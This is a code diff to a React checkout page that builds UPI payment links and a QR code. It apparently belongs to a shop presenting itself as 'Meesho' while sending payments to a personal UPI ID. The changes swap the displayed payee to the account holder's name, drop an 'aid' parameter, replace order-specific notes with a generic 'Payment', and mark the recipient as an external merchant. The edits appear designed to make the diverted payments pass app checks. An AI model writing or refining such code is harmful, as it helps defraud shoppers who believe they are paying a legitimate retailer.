@@ -45,8 +45,8 @@ export default function PaymentPage() {
 
   // Receiver details
   const upiId = "rajpatel1861997@okaxis";
+  const verifiedAccountName = "Raj Patel";
   const payeeName = "Meesho";
-  const aid = "uGICAgOD1lfiuLw";
 
   // =========================================
   // OPEN UPI PAYMENT
@@ -81,15 +81,14 @@ export default function PaymentPage() {
     dispatch(setCartTotalAction(amount));
 
     const formattedAmount = amount.toFixed(2);
-    const orderNote = `Order_${Date.now()}`;
+    const orderNote = "Payment";
     const isIOS =
       typeof navigator !== "undefined" &&
       /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-    const baseUpiQuery =
+    const cleanUpiQuery =
       `pa=${encodeURIComponent(upiId)}` +
-      `&pn=${encodeURIComponent(payeeName)}` +
-      `&aid=${encodeURIComponent(aid)}` +
+      `&pn=${encodeURIComponent(verifiedAccountName)}` +
       `&am=${formattedAmount}` +
       `&cu=INR` +
       `&tn=${encodeURIComponent(orderNote)}`;
@@ -98,7 +97,7 @@ export default function PaymentPage() {
 
     if (app === "phonepe") {
       if (isIOS) {
-        paymentUrl = `phonepe://pay?${baseUpiQuery}`;
+        paymentUrl = `phonepe://pay?${cleanUpiQuery}`;
       } else {
         const payload = {
           p2pPaymentCheckoutParams: {
@@ -112,7 +111,7 @@ export default function PaymentPage() {
           },
           contact: {
             type: "EXTERNAL_MERCHANT",
-            name: payeeName,
+            name: verifiedAccountName,
             vpa: upiId,
           },
         };
@@ -124,9 +123,9 @@ export default function PaymentPage() {
         paymentUrl = `phonepe://native?data=${encodeURIComponent(encodedPayload)}&id=p2ppayment`;
       }
     } else if (app === "paytm") {
-      paymentUrl = `paytmmp://pay?${baseUpiQuery}`;
+      paymentUrl = `paytmmp://pay?${cleanUpiQuery}`;
     } else {
-      paymentUrl = `upi://pay?${baseUpiQuery}`;
+      paymentUrl = `upi://pay?${cleanUpiQuery}`;
     }
 
     setShowPaymentOptions(false);
@@ -441,7 +440,7 @@ export default function PaymentPage() {
               <div className="bg-white p-3 rounded-2xl shadow-sm border border-gray-100 inline-block mx-auto my-1">
                 <img
                   src={`https://api.qrserver.com/v1/create-qr-code/?size=240x240&margin=8&data=${encodeURIComponent(
-                    `upi://pay?pa=${upiId}&pn=${encodeURIComponent(payeeName)}&aid=${aid}&am=${Number(totalAmount).toFixed(2)}&cu=INR`
+                    `upi://pay?pa=${upiId}&pn=${encodeURIComponent(verifiedAccountName)}&am=${Number(totalAmount).toFixed(2)}&cu=INR`
                   )}`}
                   alt="UPI Payment QR Code"
                   className="w-48 h-48 sm:w-52 sm:h-52 mx-auto object-contain rounded-lg"
